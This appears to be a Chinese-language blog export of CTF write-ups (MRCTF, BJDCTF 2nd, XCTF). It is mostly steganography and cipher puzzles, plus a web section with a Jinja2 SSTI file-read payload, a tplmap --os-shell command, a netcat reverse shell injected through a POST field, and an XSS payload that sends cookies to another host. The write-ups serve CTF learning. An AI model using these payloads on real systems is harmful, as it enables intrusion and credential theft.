<h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_misc"></a>Hello_misc</h3><p>foremost、red_plane0分离、ttl、二进制转ascii、zip转doc、隐藏文字、base64、查找显色</p>
<p>预期跑red_plane的脚本（转自<a href="http://www.ga1axy.top/index.php/archives/13/#hellomiscworld！" target="_blank" rel="noopener">ga1xy</a>师傅）</p>
<p>出题：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> bitstring</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.png'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bitcon = bitstring.Bits(f)</span><br><span class="line">    im = Image.new(<span class="string">'RGB'</span>,(<span class="number">1024</span>,<span class="number">780</span>),(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    pim = im.load()</span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> enumerate(bitcon.bin):</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">'0'</span>:</span><br><span class="line">            pim[i%<span class="number">1024</span>,i/<span class="number">1024</span>] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>)</span><br><span class="line">    im.save(<span class="string">'red_blue.png'</span>)</span><br></pre></td></tr></table></figure></div>

<p>解题：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> bitstring</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">'try to restore it.png'</span>)</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line">pim = im.load() <span class="comment"># 读取图片的像素信息</span></span><br><span class="line">bin_result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> range(height):</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(width):</span><br><span class="line">        <span class="keyword">if</span> pim[w,h][<span class="number">0</span>] == <span class="number">255</span>: <span class="comment"># 判断是否是红色（R,G,B）[0]表示第一通道</span></span><br><span class="line">            bin_result += <span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_result += <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print bitstring.BitArray(bin=bin_result).bytes.encode('hex')</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'result.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bitstring.BitArray(bin=bin_result).bytes)</span><br></pre></td></tr></table></figure></div>

<p>非预期：直接查看red_plane0通道，Save Bin</p>
<p>ttl解密脚本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i[<span class="number">0</span>:]))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line"> result += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure></div>

<a href="/2020/03/30/MRCTF/22.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/22.png" src="/img/loading.gif" class="lazyload"></a>

<p>解开后看zip组成，知道是个doc或者docx，改后缀，将下面的白色字体变色，base64解码后得到0 1字符串</p>
<a href="/2020/03/30/MRCTF/23.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/23.png" src="/img/loading.gif" class="lazyload"></a>

<p>搜索0，观察一下，得到flag</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF-2nd-wp</title>
    <url>/2020/03/21/BJDCTF-2nd-wp/</url>
    <content><![CDATA[<p>上周六，第二届BJD在buuoj上举行了，去水了一下，在这里写一些misc和crypto的wp吧（别问，问就是web基本不会</p>
<p>&nbsp;</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h3><p>思路：伪加密+补全文件头+16进制转ASCII</p>
<p>09-&gt;00，补全文件头89 50 4E 47，得到下图</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>将下面那一行转换为ASCII后得到flag：<code>BJD{y1ngzuishuai}</code></p>
<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>思路：png高度修改</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>开始没想修改高度，直接放到slover了啥也没发现，然后用zsteg没法发现隐写，最后去改了高度</p>
<p>得到flag：<code>BJD{PnG_He1ghT_1s_WR0ng}</code></p>
<h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>思路：foremost分离+改文件格式+视频逐帧+二维码反色+16进制转ASCII</p>
<p>foremost分离出了一个zip，解压得到一个jpg，格式不正确，file一下发现是avi，改后缀</p>
<p>近期钉钉“求饶”视频，但是里面混进去一些图片，pr，ae，ff不会用。。（所以我选择迅雷</p>
<p>逐帧查看后发现四张图片(都是出题人…</p>
<p><a href="/2020/03/21/BJDCTF-2nd-wp/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/3.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/21/BJDCTF-2nd-wp/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/4.png" src="/img/loading.gif" class="lazyload"></a></p>
<p><a href="/2020/03/21/BJDCTF-2nd-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/21/BJDCTF-2nd-wp/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/6.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>前三张反色完，要不PsQREdit，要不Barcode Reader都能扫出来</p>
<p>但是第4张中间有、糊，于是掏出QRazyBox自己拼了一张</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>最后把扫出来的字符串拼起来得到<code>6167696E5F6C  6F76655F59  424A447B696D  316E677D</code></p>
<p>16进制转ASCII后调整一下顺序得到flag：<code>BJD{imagin_love_Y1ng}</code></p>
<h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>思路：直接010里搜BJD</p>
<p>u1s1，图不错，这题卡了半天</p>
<p>刚开始拿stegdetect分析了一下，以为是jphide。。然后因为不知道密码是啥就一直卡住了，break爆破也爆不出来</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>最后去010里面搜了一下BJD。。（人傻了</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/9.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到flag：<code>BJD{haokanma_xjj}</code></p>
<h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>思路：010里面看flag形状（抽象带师。。</p>
<p>打开010，往下拉</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/10.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到flag：<code>BJD{572154976}</code></p>
<h3 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h3><p>思路：新佛曰+outguess隐写</p>
<p>看属性发现新佛曰，<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">解码</a>一下（得到key：gemlove，题目提示去掉com</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/11.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后根据题目hint：<code>开局一张图，flag全靠猜</code>     暗示outguess隐写</p>
<p>其实刚开始我没理解这意思，然后用stegdetect扫<code>error: Quantization table 0x00 was not defined</code></p>
<p>打开010看一下，发现大量00，20明示outguess隐写</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>解出来得到flag：<code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p>
<h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>思路：文件名为压缩包密码，多层压缩包解密</p>
<p>这题是给新生的？？记得前一阵子跟楠子哥去水Sarctf的时候就遇到过这b题，当时拆自闭了，后来也没管</p>
<p>看一了眼出题人，去<a href="https://www.gem-love.com/ctf/1471.html" target="_blank" rel="noopener">师傅博客</a>瞅了瞅，果然打Sarctf了。。当时的是无后缀zip</p>
<p>这波是有后缀.tar.gz，发现脚本，想改改，发现自己不会改。。</p>
<p>贴一下群里Orge师傅的bash脚本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -e *.tar.gz ]; <span class="keyword">do</span></span><br><span class="line">  files=*.tar.gz;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Cracking <span class="variable">$&#123;file&#125;</span>… "</span>;</span><br><span class="line">    password=<span class="variable">$&#123;file%%.*&#125;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"Failed to find password"</span>;</span><br><span class="line">      <span class="built_in">break</span> 2;</span><br><span class="line">    <span class="keyword">fi</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Found password: \`<span class="variable">$&#123;password&#125;</span>\`"</span>;</span><br><span class="line">    unzip -q -P <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> <span class="string">"<span class="variable">$file</span>"</span>;</span><br><span class="line">    rm <span class="string">"<span class="variable">$&#123;file&#125;</span>"</span>;</span><br><span class="line">  <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></div>

<p>py脚本有时间补一哈</p>
<p>最后得到flag：<code>BJD{wow_you_can_rea11y_dance}</code></p>
<h3 id="Imagin-开场曲"><a href="#Imagin-开场曲" class="headerlink" title="Imagin - 开场曲"></a>Imagin - 开场曲</h3><p>思路：玩mikutap，根据键盘键位打出相似的拍子，然后移位得到密码</p>
<p>hint：</p>
<blockquote>
<p>大写<br>mikutap<br>开场曲重复了两遍<br>flag交一遍的就行<br>格式BJD{字母+数字}<br>数字范围0-5</p>
</blockquote>
<p>（横，圈点，实心方块）x 2+ （叉，空心方块，实心散布圆，空心散布圆，实心方块，空心多边形，实心多边形）x 2+  （中心出发圆，中心出发圆，空心多边形，中心出发圆）x 2 </p>
<p>听就完事了…..最后得到flag：<code>BJD{MIKUTAP3313313}</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>做的全是1分的嗷，菜鸡不愿去找RSA脚本了</p>
<h3 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h3><p>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==</p>
<p>base64解码得到flag：<code>BJD{W3lc0me_T0_BJDCTF}</code></p>
<h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>这题给爷整笑了，百度翻译读一下</p>
<p>去掉BJD{}对应的字，得到flag：<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p>
<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><a href="/2020/03/21/BJDCTF-2nd-wp/13.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/13.gif" src="/img/loading.gif" class="lazyload"></a>

<p>拿🍙的是0，拿🍗的是1，翻译一下，二进制转ASCII</p>
<p>得到flag：<code>BJD{M!a0~}</code></p>
<h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><a href="/2020/03/21/BJDCTF-2nd-wp/14.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/21/BJDCTF-2nd-wp/14.png" src="/img/loading.gif" class="lazyload"></a>

<p>圣堂武士密码，翻译一哈，flag：<code>BJD{IMKNIGHTSTEMPLAR}</code></p>
<h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>16进制转ASCII+维吉尼亚密码</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/16.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/16.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到flag：<code>bjd{yanzi_jiushige_shabi}</code></p>
<h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><p>本来以为这题是词频分析，然后直接上脚本，还把字母顺序和最常出现字母顺序对应了一下，然并卵</p>
<p>最后收到群里师傅的启发用<a href="https://www.quipqiup.com" target="_blank" rel="noopener">quipquip</a>（解一些简单替换密码，其中MIH明显对应BJD</p>
<p>hint中提示都是英文单词，所以把y替换成k</p>
<p>最后得到flag：<code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>SSTI模板注入 （jinjia2</p>
<p>随意输一个数字在网页源代码出看到提示ssssssti，然而并不会…..</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/17.png" src="/img/loading.gif" class="lazyload"></a>

<p>根据<a href="https://www.1p0ch.cn" target="_blank" rel="noopener">王牌辅助楠子神</a>给的提示，搜SSTI模板注入，大概看懂了点，讲也讲不出来，直接放payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">markdown</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>还有参考的<a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener">师傅的博客</a></p>
<p>好像还有一种<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a>的解法</p>
<blockquote>
<p>Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。</p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./tplmap.py -u http://9df44046-64a1-4ab3-b167-6e2bca4fe272.node3.buuoj.cn/qaq?name= --os-shell</span><br></pre></td></tr></table></figure></div>

<a href="/2020/03/21/BJDCTF-2nd-wp/22.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/22.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>网站提示：Power By thinkphp5</p>
<p>随便输入一个s参数，报错如下</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/20.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/20.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到tp版本，网上搜一下<a href="https://blog.csdn.net/qq_38807738/article/details/86777541" target="_blank" rel="noopener">5.0.23</a>的漏洞，可以直接用的，得到flag</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/21.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/21.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>开始是个vim文件泄露，而且没走寻常路，dirsearch也没扫出来</p>
<p>备份文件在/.index.php.swp里，vim -r  恢复一下</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/18.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/18.png" src="/img/loading.gif" class="lazyload"></a>

<p>起初以为是个RCE，绕倒是不难，但是它没回显。。</p>
<p>于是就开始了我漫长的，弹shell之路。试过bash，python，curl，perl，nc…..</p>
<p>应该是我姿势不对。。在比赛结束后Yoshino-s师傅在群里的一句<code>nc ip port -e sh</code>点醒了我。。</p>
<p>接下来就是反弹个shell，在里面找flag就好了</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#自己起的basic linux labs</span></span><br><span class="line">ifconfig</span><br><span class="line">nc -lvp port</span><br><span class="line"><span class="comment">#post的数据</span></span><br><span class="line">girl_friend=nc ip port -e sh</span><br></pre></td></tr></table></figure></div>

<p>最后在<code>./etc/demo/P3rh4ps/love/you</code>中找到flag</p>
<h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>这是一道考HTTP头的题</p>
<p>包含了：Client-ip、Referer、From、Cookie、UA还有Via</p>
<p>先随便登录后查看源代码，提示存在L0g1n.php，进去之后就一层层绕就完事了</p>
<p>XFF被ban了，可以构造Client-ip</p>
<p>UA谷歌一下发现是国外的一道原题，包含Commodore 64就好</p>
<p>最后卡到Via好久，一直以为是Proxy-Authorization要去爆破用户名加密码的base64，失败了。</p>
<p>后来看到群里师傅发的截图才知道Via</p>
<blockquote>
<p>列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加 Via 头部，并填上自己的相关信息，当下一个代理服务器 收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面， 以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。</p>
</blockquote>
<p>再开环境做了一遍得到flag</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/19.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><p>Git源码泄露，反序列化，xss</p>
<p>开局  gungungun  老祖安人了，查看源码啥也没有，扫一下目录，发现Git泄露</p>
<a href="/2020/03/21/BJDCTF-2nd-wp/23.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/23.png" src="/img/loading.gif" class="lazyload"></a>

<p>提示有xss漏洞，利用php原生类构造payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = serialize(<span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.location.href='http://b9c4633b-9ce6-4937-8b9f-a1b02de9a086.node3.buuoj.cn/'+document.cookie&lt;/script&gt;"</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>

<a href="/2020/03/21/BJDCTF-2nd-wp/24.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/24.png" src="/img/loading.gif" class="lazyload"></a>

<p>在cookie中得到url编码的flag，解码后得到flag</p>
<p>&nbsp;</p>
<p>这是新生赛？？让我深刻地认识到自己连新生都不如了。（我感觉BJD 1st 也不简单</p>
<p>慢慢来吧，转转型，misc是兴趣，web是饭碗（hhh</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
        <tag>misc</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>高校战&quot;疫&quot;-misc-wp</title>
    <url>/2020/03/09/xctf-misc-wp/</url>
    <content><![CDATA[<h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>虽然计网和OS作业还没写，但是奈何不想写啊。。。于是就写篇博客玩吧。。。。</p>
<p>上周末有一场高校战“疫”赛在adworld平台上举行了，作为联盟学校的一员当然要去水一水啦。</p>
<p>不过恰巧比赛前一天博客炸了，搞到半夜，第二天早上没起来。。</p>
<p>早上起来的时候发现签到题和一道misc已经被做了，伤心！（web是不敢想的，也就水水misc。。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="简单misc"><a href="#简单misc" class="headerlink" title="简单misc"></a>简单misc</h4><p>思路：文件头修复+文件分离+摩斯密码+base64</p>
<p>用winhex或者010editor或者hxd打开文件，修复文件头为FFD8</p>
<a href="/2020/03/09/xctf-misc-wp/1.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/09/xctf-misc-wp/1.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>好像并没有什么有用的信息，搜一下文件尾FFD9，发现后面有个压缩包</p>
<p>手动提取也行，binwalk也行，foremost也行（最近爱上了手撕，因为不用往linux里放了</p>
<p>解压后发现一段摩斯密码：<code>./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.</code> 解密一下：<code>EPIDEMICSITUATIONOFUNIVERSITYWAR</code></p>
<p>这个就是flag压缩包的密码，解压后得到一传base64：<code>VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=</code>解码一下得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Th1s_is_FlaG_you_aRE_rigHT</span><br></pre></td></tr></table></figure></div>

<p>&nbsp;</p>
<h4 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h4><p>反色二维码补全扫码+伪加密+频谱图(高群、低群)电话音分析+base64加密</p>
<p>把二维码里面反色一下，补上三个定位点</p>
<a href="/2020/03/09/xctf-misc-wp/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>扫出来是：<code>flag{this_is_also_not_flag} 解压密码不在这里0.0！</code></p>
<p>并没有什么卵用，然后还在二维码那张图片里发现了这个</p>
<a href="/2020/03/09/xctf-misc-wp/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/09/xctf-misc-wp/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>应该是找出隐藏的信息后base64加密（后面是TOGETYOUFLAG</p>
<p>然后就是那个纯数字的压缩包，我从1位爆破到10位后，感觉不对劲</p>
<a href="/2020/03/09/xctf-misc-wp/4.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/09/xctf-misc-wp/4.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>再高位数跑完怕不是比赛都结束了，放进010一看，淦，伪加密</p>
<p>解开后得到一个音频，放进Audacity看一下，发现正巧是前几天看的<a href="https://www.ichunqiu.com/course/61665" target="_blank" rel="noopener">视频</a>里的（拨号音</p>
<p><a href="/2020/03/09/xctf-misc-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/09/xctf-misc-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>手解一下</p>
<a href="/2020/03/09/xctf-misc-wp/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/09/xctf-misc-wp/7.png" src="/img/loading.gif" class="lazyload"></a>

